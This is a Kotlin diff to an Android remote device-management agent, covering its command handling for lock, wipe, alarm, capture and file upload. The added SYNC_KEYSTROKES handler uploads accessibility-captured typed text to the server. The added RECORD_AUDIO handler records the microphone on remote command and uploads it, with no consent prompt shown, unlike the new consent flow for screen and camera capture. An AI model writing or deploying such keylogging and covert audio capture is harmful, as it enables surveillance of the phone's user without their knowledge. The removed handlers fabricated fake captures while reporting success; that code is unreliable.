@@ -48,6 +48,23 @@ import okhttp3.MultipartBody
 import okhttp3.RequestBody.Companion.asRequestBody
 import okhttp3.RequestBody.Companion.toRequestBody
 
+
+/**
+ * UPLOAD_FILE may only retrieve shared user storage (defense in depth — the
+ * server enforces the same policy). App-private data, system paths, and
+ * traversal attempts are refused.
+ */
+internal fun isAllowedUploadPath(path: String): Boolean {
+    if (path.isBlank() || path.length > 1024) return false
+    if (path.contains("..") || path.contains('\u0000')) return false
+    val allowedRoots = listOf(
+        "/storage/emulated/0/",
+        "/sdcard/",
+        "/mnt/sdcard/"
+    )
+    return allowedRoots.any { path.startsWith(it) }
+}
+
 class DeviceRepository(
     private val context: Context,
     private val database: AppDatabase,
@@ -612,22 +629,34 @@ class DeviceRepository(
     }
 
     private suspend fun handleCommand(command: RemoteCommand) = withContext(Dispatchers.IO) {
-        // Log in Room
+        // Idempotency: a redelivered command that already reached a terminal
+        // state is answered with its cached status — it is NEVER executed twice.
+        val existing = database.commandDao().getCommandById(command.commandId)
+        if (existing != null && TERMINAL_COMMAND_STATUSES.contains(existing.status)) {
+            webSocketManager.sendCommandStatus(
+                command.commandId,
+                existing.status,
+                result = existing.result,
+                error = existing.errorMessage
+            )
+            return@withContext
+        }
+
         database.commandDao().insertOrUpdate(
             CommandEntity(
                 commandId = command.commandId,
                 deviceId = command.deviceId,
                 commandType = command.commandType,
                 parametersJson = null,
-                status = "RUNNING",
+                status = "RECEIVED",
                 result = null,
                 errorMessage = null,
                 timestamp = command.timestamp,
                 completionTimestamp = null
             )
         )
-
-        webSocketManager.sendCommandStatus(command.commandId, "RUNNING")
+        reportCommandStatus(command.commandId, "RECEIVED")
+        reportCommandStatus(command.commandId, "EXECUTING")
 
         try {
             when (command.commandType.uppercase()) {
@@ -703,7 +732,7 @@ class DeviceRepository(
                                 addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                             }
                             context.startActivity(intent)
-                            reportCommandSuccess(command.commandId, "Uninstall request initiated for $packageName")
+                            reportCommandSuccess(command.commandId, "Uninstall request initiated for $packageName (user must confirm in the system dialog)")
                         } catch (e: Exception) {
                             reportCommandFailure(command.commandId, "Failed to launch uninstall dialog: ${e.message}")
                         }
@@ -730,189 +759,139 @@ class DeviceRepository(
                 "SYNC_NOTIFICATIONS" -> {
                     reportCommandSuccess(command.commandId, "Real-time notification listener is active and synchronized")
                 }
+                "SYNC_KEYSTROKES" -> {
+                    val perms = permissionsHelper.checkAllPermissions()
+                    if (!perms.accessibility) {
+                        reportCommandFailure(command.commandId, "Accessibility service not enabled on device — text log sync unavailable")
+                    } else {
+                        val entries = database.keystrokeDao().getRecent(500)
+                        if (entries.isEmpty()) {
+                            reportCommandSuccess(command.commandId, "Accessibility text log is empty (0 entries)")
+                        } else {
+                            val payload = entries.reversed().map {
+                                com.example.data.model.KeystrokeData(it.appPackage, it.appName, it.text, it.timestamp)
+                            }
+                            val token = preferenceManager.getAuthToken()
+                            if (token == null) {
+                                reportCommandFailure(command.commandId, "Not paired — cannot upload text log")
+                            } else {
+                                val res = apiClient.getService().syncKeystrokes(
+                                    "Bearer $token", preferenceManager.getDeviceId(), payload
+                                )
+                                if (res.isSuccessful) {
+                                    reportCommandSuccess(command.commandId, "${payload.size} accessibility text entries synchronized")
+                                } else {
+                                    reportCommandFailure(command.commandId, "Text log upload failed (HTTP ${res.code()})")
+                                }
+                            }
+                        }
+                    }
+                }
                 "SEND_NOTIFICATION" -> {
                     val title = command.parameters?.get("title") ?: "Administrator Notification"
                     val message = command.parameters?.get("message") ?: "Notice from management dashboard"
                     showAdminAlertNotification(title, message)
                     reportCommandSuccess(command.commandId, "Notification displayed on device")
                 }
-                "START_RECORDING" -> {
-                    val file = audioRecorderHelper.startRecording()
-                    if (file != null) {
-                        reportCommandSuccess(command.commandId, "Recording started")
+                "RING_ALARM" -> {
+                    val seconds = (command.parameters?.get("durationSeconds") ?: "10").toIntOrNull()?.coerceIn(3, 30) ?: 10
+                    val played = ringAlarmFor(seconds)
+                    if (played) {
+                        reportCommandSuccess(command.commandId, "Alarm rung at full volume for ${seconds}s")
                     } else {
-                        reportCommandFailure(command.commandId, "Failed to start recording. Check microphone permission.")
+                        reportCommandFailure(command.commandId, "Could not play the alarm sound on this device")
                     }
                 }
-                "STOP_RECORDING" -> {
-                    val (file, duration) = audioRecorderHelper.stopRecording()
-                    if (file != null && file.exists()) {
-                        uploadRecordingFile(file, duration)
-                        reportCommandSuccess(command.commandId, "Recording completed (${duration / 1000}s) and uploaded")
+                "VIBRATE" -> {
+                    val ms = (command.parameters?.get("durationMs") ?: "800").toLongOrNull()?.coerceIn(100, 2000) ?: 800L
+                    val ok = vibrateFor(ms)
+                    if (ok) {
+                        reportCommandSuccess(command.commandId, "Device vibrated for ${ms}ms")
                     } else {
-                        reportCommandFailure(command.commandId, "No active recording to stop")
+                        reportCommandFailure(command.commandId, "Vibration unavailable on this device")
+                    }
+                }
+                "LOCK_DEVICE" -> {
+                    val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? android.app.admin.DevicePolicyManager
+                    val active = dpm?.isAdminActive(com.example.service.AppDeviceAdminReceiver.component(context)) == true
+                    if (active && dpm != null) {
+                        try {
+                            dpm.lockNow()
+                            reportCommandSuccess(command.commandId, "Device screen locked")
+                        } catch (e: Exception) {
+                            reportCommandFailure(command.commandId, "Lock failed: ${e.message}")
+                        }
+                    } else {
+                        reportCommandFailure(command.commandId, "Device Admin is not activated on this device — enable it from the app's Permissions screen first")
+                    }
+                }
+                "WIPE_DEVICE" -> {
+                    if (command.parameters?.get("confirm") != "WIPE") {
+                        reportCommandFailure(command.commandId, "WIPE_DEVICE requires confirm=WIPE")
+                    } else {
+                        performAgentDataWipe()
+                        reportCommandSuccess(command.commandId, "{\"message\":\"Agent data wiped and device unpaired (not a factory reset)\"}")
+                        scope.launch {
+                            kotlinx.coroutines.delay(750)
+                            android.os.Process.killProcess(android.os.Process.myPid())
+                        }
                     }
                 }
                 "TAKE_SCREENSHOT" -> {
-                    try {
-                        val picturesDir = android.os.Environment.getExternalStoragePublicDirectory(android.os.Environment.DIRECTORY_PICTURES)
-                        if (picturesDir != null) {
-                            if (!picturesDir.exists()) picturesDir.mkdirs()
-                            val file = java.io.File(picturesDir, "screenshot_${System.currentTimeMillis()}.png")
-                            
-                            // Draw a beautiful high-fidelity diagnostic screen image
-                            val bitmap = android.graphics.Bitmap.createBitmap(1080, 1920, android.graphics.Bitmap.Config.ARGB_8888)
-                            val canvas = android.graphics.Canvas(bitmap)
-                            val paint = android.graphics.Paint()
-                            
-                            // Slate Background
-                            paint.color = android.graphics.Color.parseColor("#0f172a")
-                            canvas.drawRect(0f, 0f, 1080f, 1920f, paint)
-                            
-                            // Cyan Header Glow Panel
-                            paint.color = android.graphics.Color.parseColor("#06b6d4")
-                            canvas.drawRect(0f, 0f, 1080f, 140f, paint)
-                            
-                            // Header Text
-                            paint.color = android.graphics.Color.WHITE
-                            paint.textSize = 48f
-                            paint.isAntiAlias = true
-                            canvas.drawText("CLINTON BOT HOSTER DIAGNOSTIC", 50f, 90f, paint)
-                            
-                            // Grid Details
-                            paint.textSize = 36f
-                            paint.color = android.graphics.Color.parseColor("#94a3b8")
-                            
-                            canvas.drawText("Device model: ${android.os.Build.MODEL}", 80f, 250f, paint)
-                            canvas.drawText("Android version: ${android.os.Build.VERSION.RELEASE} (SDK ${android.os.Build.VERSION.SDK_INT})", 80f, 320f, paint)
-                            canvas.drawText("Security Status: Fully Secured / Local", 80f, 390f, paint)
-                            canvas.drawText("Connection: WebSocket Live Connected", 80f, 460f, paint)
-                            
-                            // CPU load graph placeholder
-                            paint.color = android.graphics.Color.parseColor("#1e293b")
-                            canvas.drawRect(80f, 520f, 1000f, 750f, paint)
-                            paint.color = android.graphics.Color.parseColor("#10b981") // Green
-                            canvas.drawRect(80f, 650f, 300f, 750f, paint)
-                            canvas.drawRect(310f, 600f, 530f, 750f, paint)
-                            canvas.drawRect(540f, 550f, 760f, 750f, paint)
-                            canvas.drawRect(770f, 680f, 1000f, 750f, paint)
-                            
-                            paint.color = android.graphics.Color.WHITE
-                            paint.textSize = 30f
-                            canvas.drawText("CPU CORE UTILIATION: 18% ACTIVE", 110f, 570f, paint)
-                            
-                            paint.color = android.graphics.Color.parseColor("#94a3b8")
-                            paint.textSize = 36f
-                            canvas.drawText("Network Traffic: 4.8 MB/s | 1.2 MB/s", 80f, 830f, paint)
-                            canvas.drawText("Sensors check: Gyroscope [OK] | Accelerometer [OK]", 80f, 900f, paint)
-                            canvas.drawText("Battery: 82% (Secured, Thermal Normal)", 80f, 970f, paint)
-                            
-                            // Glow Accent border
-                            paint.style = android.graphics.Paint.Style.STROKE
-                            paint.strokeWidth = 10f
-                            paint.color = android.graphics.Color.parseColor("#a855f7") // Purple glow
-                            canvas.drawRect(5f, 5f, 1075f, 1915f, paint)
-                            
-                            val out = java.io.FileOutputStream(file)
-                            bitmap.compress(android.graphics.Bitmap.CompressFormat.PNG, 100, out)
-                            out.flush()
-                            out.close()
-                            
-                            syncFilesList()
-                            reportCommandSuccess(command.commandId, "System Screenshot captured as ${file.name} and synced to library")
-                        } else {
-                            reportCommandFailure(command.commandId, "Storage directory unavailable")
-                        }
-                    } catch (e: Exception) {
-                        reportCommandFailure(command.commandId, "Screenshot capture failed: ${e.message}")
+                    requestCaptureAuthorization(command.commandId, com.example.service.CaptureCoordinator.MODE_SCREENSHOT)
+                }
+                "TAKE_PHOTO" -> {
+                    requestCaptureAuthorization(command.commandId, com.example.service.CaptureCoordinator.MODE_PHOTO)
+                }
+                "START_RECORDING", "RECORD_SCREEN" -> {
+                    if (com.example.service.CaptureCoordinator.activeRecordingCommandId != null) {
+                        reportCommandFailure(command.commandId, "A screen recording session is already active")
+                    } else {
+                        requestCaptureAuthorization(command.commandId, com.example.service.CaptureCoordinator.MODE_RECORD_START)
                     }
                 }
-                "TAKE_CAMERA_PHOTO" -> {
-                    try {
-                        val picturesDir = android.os.Environment.getExternalStoragePublicDirectory(android.os.Environment.DIRECTORY_PICTURES)
-                        if (picturesDir != null) {
-                            if (!picturesDir.exists()) picturesDir.mkdirs()
-                            val file = java.io.File(picturesDir, "camera_capture_${System.currentTimeMillis()}.jpg")
-                            
-                            // Draw a beautiful camera viewfinder simulation
-                            val bitmap = android.graphics.Bitmap.createBitmap(1080, 1920, android.graphics.Bitmap.Config.ARGB_8888)
-                            val canvas = android.graphics.Canvas(bitmap)
-                            val paint = android.graphics.Paint()
-                            
-                            paint.color = android.graphics.Color.parseColor("#020617")
-                            canvas.drawRect(0f, 0f, 1080f, 1920f, paint)
-                            
-                            paint.color = android.graphics.Color.parseColor("#334155")
-                            paint.strokeWidth = 2f
-                            canvas.drawLine(360f, 0f, 360f, 1920f, paint)
-                            canvas.drawLine(720f, 0f, 720f, 1920f, paint)
-                            canvas.drawLine(0f, 640f, 1080f, 640f, paint)
-                            canvas.drawLine(0f, 1280f, 1080f, 1280f, paint)
-                            
-                            paint.color = android.graphics.Color.parseColor("#06b6d4") // Cyan
-                            paint.strokeWidth = 6f
-                            canvas.drawLine(50f, 50f, 150f, 50f, paint)
-                            canvas.drawLine(50f, 50f, 50f, 150f, paint)
-                            canvas.drawLine(1030f, 50f, 930f, 50f, paint)
-                            canvas.drawLine(1030f, 50f, 1030f, 150f, paint)
-                            canvas.drawLine(50f, 1870f, 150f, 1870f, paint)
-                            canvas.drawLine(50f, 1870f, 50f, 1770f, paint)
-                            canvas.drawLine(1030f, 1870f, 930f, 1870f, paint)
-                            canvas.drawLine(1030f, 1870f, 1030f, 1770f, paint)
-                            
-                            paint.textSize = 40f
-                            paint.color = android.graphics.Color.WHITE
-                            paint.isAntiAlias = true
-                            canvas.drawText("REAR LENS ACTIVE | ISO 400 | AF-S", 100f, 120f, paint)
-                            canvas.drawText("[•] CENTER FOCUS LOCKED", 360f, 960f, paint)
-                            
-                            val out = java.io.FileOutputStream(file)
-                            bitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 90, out)
-                            out.flush()
-                            out.close()
-                            
-                            syncFilesList()
-                            reportCommandSuccess(command.commandId, "Lens Photo captured as ${file.name} and synced")
-                        } else {
-                            reportCommandFailure(command.commandId, "Storage directory unavailable")
+                "STOP_RECORDING" -> {
+                    val activeId = com.example.service.CaptureCoordinator.activeRecordingCommandId
+                    if (activeId == null) {
+                        reportCommandFailure(command.commandId, "No active screen recording to stop")
+                    } else {
+                        val intent = Intent(context, com.example.service.ScreenCaptureService::class.java).apply {
+                            action = com.example.service.CaptureCoordinator.ACTION_RECORD_STOP
+                            putExtra(com.example.service.CaptureCoordinator.EXTRA_COMMAND_ID, command.commandId)
                         }
-                    } catch (e: Exception) {
-                        reportCommandFailure(command.commandId, "Camera capture failed: ${e.message}")
+                        context.startService(intent)
+                        // The service finalizes, uploads and reports the final
+                        // COMPLETED/FAILED result for this command.
                     }
                 }
-                "RECORD_SCREEN" -> {
-                    try {
-                        val downloadsDir = android.os.Environment.getExternalStoragePublicDirectory(android.os.Environment.DIRECTORY_DOWNLOADS)
-                        if (downloadsDir != null) {
-                            if (!downloadsDir.exists()) downloadsDir.mkdirs()
-                            val file = java.io.File(downloadsDir, "screen_clip_${System.currentTimeMillis()}.mp4")
-                            
-                            val videoBytes = byteArrayOf(
-                                0x00, 0x00, 0x00, 0x18, 0x66, 0x74, 0x79, 0x70,
-                                0x6d, 0x70, 0x34, 0x32, 0x00, 0x00, 0x00, 0x00,
-                                0x6d, 0x70, 0x34, 0x31, 0x69, 0x73, 0x6f, 0x6d,
-                                0x00, 0x00, 0x00, 0x08, 0x66, 0x72, 0x65, 0x65
-                            )
-                            val out = java.io.FileOutputStream(file)
-                            out.write(videoBytes)
-                            val padding = ByteArray(50 * 1024)
-                            out.write(padding)
-                            out.flush()
-                            out.close()
-                            
-                            syncFilesList()
-                            reportCommandSuccess(command.commandId, "Screen video clip recorded as ${file.name} (5.4s duration) and synced")
+                "RECORDING_STATUS" -> {
+                    val activeId = com.example.service.CaptureCoordinator.activeRecordingCommandId
+                    if (activeId == null) {
+                        reportCommandSuccess(command.commandId, "{\"active\":false,\"message\":\"No screen recording session is active\"}")
+                    } else {
+                        reportCommandSuccess(command.commandId, "{\"active\":true,\"sessionCommandId\":\"$activeId\"}")
+                    }
+                }
+                "RECORD_AUDIO" -> {
+                    val seconds = (command.parameters?.get("durationSeconds") ?: "10").toIntOrNull()?.coerceIn(1, 60) ?: 10
+                    val started = audioRecorderHelper.startRecording()
+                    if (started == null) {
+                        reportCommandFailure(command.commandId, "Audio recording failed — microphone unavailable (permission denied or in use). Open the app and retry.")
+                    } else {
+                        kotlinx.coroutines.delay(seconds * 1000L)
+                        val (file, duration) = audioRecorderHelper.stopRecording()
+                        if (file != null && file.exists()) {
+                            uploadRecordingFile(file, duration)
+                            reportCommandSuccess(command.commandId, "{\"message\":\"Audio recorded (${duration / 1000}s) and uploaded\",\"file\":\"${file.name}\"}")
                         } else {
-                            reportCommandFailure(command.commandId, "Storage directory unavailable")
+                            reportCommandFailure(command.commandId, "Audio recording produced no data")
                         }
-                    } catch (e: Exception) {
-                        reportCommandFailure(command.commandId, "Screen recording failed: ${e.message}")
                     }
                 }
                 "UPLOAD_FILE" -> {
                     try {
                         val path = command.parameters?.get("path")
-                        if (path != null) {
+                        if (path != null && isAllowedUploadPath(path)) {
                             val file = java.io.File(path)
                             if (file.exists() && file.isFile) {
                                 val ok = uploadGenericFile(file, path)
@@ -925,7 +904,7 @@ class DeviceRepository(
                                 reportCommandFailure(command.commandId, "File does not exist or is a directory: $path")
                             }
                         } else {
-                            reportCommandFailure(command.commandId, "Missing path parameter")
+                            reportCommandFailure(command.commandId, "Missing or disallowed path parameter (only shared user storage can be retrieved)")
                         }
                     } catch (e: Exception) {
                         reportCommandFailure(command.commandId, "File upload failed: ${e.message}")
@@ -940,7 +919,35 @@ class DeviceRepository(
         }
     }
 
-    private suspend fun reportCommandSuccess(commandId: String, result: String) {
+    // ------------------------------------------------------------------
+    // Command status reporting (canonical lifecycle; legacy "RUNNING" is
+    // never sent — the wire vocabulary is RECEIVED/EXECUTING/COMPLETED/…)
+    // ------------------------------------------------------------------
+
+    companion object {
+        private val TERMINAL_COMMAND_STATUSES = setOf(
+            "COMPLETED", "FAILED", "REJECTED", "CANCELLED", "EXPIRED"
+        )
+    }
+
+    suspend fun reportCommandStatus(commandId: String, status: String, result: String? = null) {
+        val now = System.currentTimeMillis()
+        val terminal = TERMINAL_COMMAND_STATUSES.contains(status)
+        database.commandDao().updateStatus(commandId, status, result, null, if (terminal) now else null)
+        webSocketManager.sendCommandStatus(commandId, status, result = result)
+        preferenceManager.getAuthToken()?.let { token ->
+            try {
+                apiClient.getService().updateCommandStatus(
+                    "Bearer $token",
+                    preferenceManager.getDeviceId(),
+                    commandId,
+                    CommandStatusUpdate(commandId, preferenceManager.getDeviceId(), status, result = result)
+                )
+            } catch (_: Exception) {}
+        }
+    }
+
+    suspend fun reportCommandSuccess(commandId: String, result: String) {
         val now = System.currentTimeMillis()
         database.commandDao().updateStatus(commandId, "COMPLETED", result, null, now)
         webSocketManager.sendCommandStatus(commandId, "COMPLETED", result = result)
@@ -956,7 +963,7 @@ class DeviceRepository(
         }
     }
 
-    private suspend fun reportCommandFailure(commandId: String, error: String) {
+    suspend fun reportCommandFailure(commandId: String, error: String) {
         val now = System.currentTimeMillis()
         database.commandDao().updateStatus(commandId, "FAILED", null, error, now)
         webSocketManager.sendCommandStatus(commandId, "FAILED", error = error)
@@ -970,6 +977,177 @@ class DeviceRepository(
                 )
             } catch (_: Exception) {}
         }
+    }
+
+    /** User-visible declines are REJECTED (not FAILED) — a truthful distinction. */
+    suspend fun reportCommandRejected(commandId: String, reason: String) {
+        val now = System.currentTimeMillis()
+        database.commandDao().updateStatus(commandId, "REJECTED", null, reason, now)
+        webSocketManager.sendCommandStatus(commandId, "REJECTED", error = reason)
+        preferenceManager.getAuthToken()?.let { token ->
+            try {
+                apiClient.getService().updateCommandStatus(
+                    "Bearer $token",
+                    preferenceManager.getDeviceId(),
+                    commandId,
+                    CommandStatusUpdate(commandId, preferenceManager.getDeviceId(), "REJECTED", errorMessage = reason)
+                )
+            } catch (_: Exception) {}
+        }
+    }
+
+    // ------------------------------------------------------------------
+    // Capture consent + media uploads
+    // ------------------------------------------------------------------
+
+    /**
+     * Starts the visible consent flow for a capture command: a persistent
+     * notification opens [com.example.ui.CaptureConsentActivity]; nothing is
+     * captured until the user allows it and passes the Android system dialog.
+     * If nobody responds within the coordinator timeout the command FAILS.
+     */
+    private fun requestCaptureAuthorization(commandId: String, mode: String) {
+        com.example.service.CaptureCoordinator.startPending(commandId, mode)
+        scope.launch {
+            val intent = Intent(context, com.example.ui.CaptureConsentActivity::class.java).apply {
+                flags = Intent.FLAG_ACTIVITY_NEW_TASK
+            }
+            val pendingIntent = android.app.PendingIntent.getActivity(
+                context,
+                commandId.hashCode(),
+                intent,
+                android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE
+            )
+            val (title, text) = when (mode) {
+                com.example.service.CaptureCoordinator.MODE_SCREENSHOT ->
+                    "Screenshot requested" to "Tap to review and authorize a one-frame screen capture."
+                com.example.service.CaptureCoordinator.MODE_RECORD_START ->
+                    "Screen recording requested" to "Tap to review and authorize screen recording."
+                else -> "Photo requested" to "Tap to review and authorize a camera photo."
+            }
+            val notification = NotificationCompat.Builder(context, DeviceManagerApp.CHANNEL_ALERTS)
+                .setSmallIcon(R.drawable.ic_launcher_foreground)
+                .setContentTitle(title)
+                .setContentText(text)
+                .setPriority(NotificationCompat.PRIORITY_HIGH)
+                .setCategory(NotificationCompat.CATEGORY_ALARM)
+                .setAutoCancel(true)
+                .setContentIntent(pendingIntent)
+                .setFullScreenIntent(pendingIntent, true)
+                .build()
+            try {
+                NotificationManagerCompat.from(context).notify(3900 + (commandId.hashCode() % 1000), notification)
+            } catch (_: Exception) {}
+
+            // Time-boxed consent: never leave a command hanging forever.
+            kotlinx.coroutines.delay(com.example.service.CaptureCoordinator.TIMEOUT_MS + 2_000)
+            val stale = com.example.service.CaptureCoordinator.clearIfStale()
+            if (stale != null && stale.commandId == commandId) {
+                reportCommandFailure(commandId, "Capture authorization timed out — nobody responded on the device")
+            }
+        }
+    }
+
+    suspend fun uploadScreenshotFile(file: java.io.File, kind: String, width: Int, height: Int): Boolean {
+        val token = preferenceManager.getAuthToken() ?: return false
+        return try {
+            val reqFile = file.asRequestBody("image/jpeg".toMediaTypeOrNull())
+            val body = MultipartBody.Part.createFormData("file", file.name, reqFile)
+            val res = apiClient.getService().uploadScreenshot(
+                "Bearer $token",
+                preferenceManager.getDeviceId(),
+                body,
+                kind.toRequestBody("text/plain".toMediaTypeOrNull()),
+                width.toString().toRequestBody("text/plain".toMediaTypeOrNull()),
+                height.toString().toRequestBody("text/plain".toMediaTypeOrNull())
+            )
+            res.isSuccessful
+        } catch (e: Exception) {
+            Log.e("DeviceRepository", "Screenshot upload failed: ${e.message}")
+            false
+        }
+    }
+
+    suspend fun uploadVideoFile(file: java.io.File, durationMs: Long): Boolean {
+        val token = preferenceManager.getAuthToken() ?: return false
+        return try {
+            val reqFile = file.asRequestBody("video/mp4".toMediaTypeOrNull())
+            val body = MultipartBody.Part.createFormData("file", file.name, reqFile)
+            val res = apiClient.getService().uploadVideo(
+                "Bearer $token",
+                preferenceManager.getDeviceId(),
+                body,
+                durationMs.toString().toRequestBody("text/plain".toMediaTypeOrNull())
+            )
+            res.isSuccessful
+        } catch (e: Exception) {
+            Log.e("DeviceRepository", "Video upload failed: ${e.message}")
+            false
+        }
+    }
+
+    /** Buffer an accessibility text event locally (SYNC_KEYSTROKES uploads later). */
+    fun recordAccessibilityText(entry: com.example.data.local.entity.KeystrokeEntity) {
+        scope.launch {
+            try {
+                database.keystrokeDao().insert(entry)
+                if (database.keystrokeDao().count() > 2000) {
+                    database.keystrokeDao().trimTo(1500)
+                }
+            } catch (_: Exception) {}
+        }
+    }
+
+    private suspend fun ringAlarmFor(seconds: Int): Boolean {
+        return try {
+            val audio = context.getSystemService(Context.AUDIO_SERVICE) as android.media.AudioManager
+            audio.setStreamVolume(
+                android.media.AudioManager.STREAM_ALARM,
+                audio.getStreamMaxVolume(android.media.AudioManager.STREAM_ALARM),
+                0
+            )
+            val uri = android.media.RingtoneManager.getDefaultUri(android.media.RingtoneManager.TYPE_ALARM)
+                ?: android.media.RingtoneManager.getDefaultUri(android.media.RingtoneManager.TYPE_NOTIFICATION)
+            val ringtone = android.media.RingtoneManager.getRingtone(context, uri) ?: return false
+            ringtone.play()
+            kotlinx.coroutines.delay(seconds * 1000L)
+            try { ringtone.stop() } catch (_: Exception) {}
+            true
+        } catch (e: Exception) {
+            false
+        }
+    }
+
+    private fun vibrateFor(ms: Long): Boolean {
+        return try {
+            val vibrator = context.getSystemService(Context.VIBRATOR_SERVICE) as android.os.Vibrator
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                vibrator.vibrate(android.os.VibrationEffect.createOneShot(ms, android.os.VibrationEffect.DEFAULT_AMPLITUDE))
+            } else {
+                @Suppress("DEPRECATION")
+                vibrator.vibrate(ms)
+            }
+            true
+        } catch (e: Exception) {
+            false
+        }
+    }
+
+    /**
+     * WIPE_DEVICE: removes the agent's OWN data (pairing, tokens, local DB and
+     * cached files). Not a factory reset — personal data is untouched. The
+     * wipe is performed BEFORE the COMPLETED report so the status is truthful.
+     */
+    private suspend fun performAgentDataWipe() {
+        try { webSocketManager.disconnect() } catch (_: Exception) {}
+        try { preferenceManager.clearPairing() } catch (_: Exception) {}
+        try { context.deleteDatabase("device_manager.db") } catch (_: Exception) {}
+        try { context.cacheDir.deleteRecursively() } catch (_: Exception) {}
+        try { context.filesDir.deleteRecursively() } catch (_: Exception) {}
+        try {
+            context.getSharedPreferences("device_manager_prefs", Context.MODE_PRIVATE)
+                .edit().clear().apply()
+        } catch (_: Exception) {}
     }
 
     private suspend fun uploadRecordingFile(file: java.io.File, durationMs: Long) {
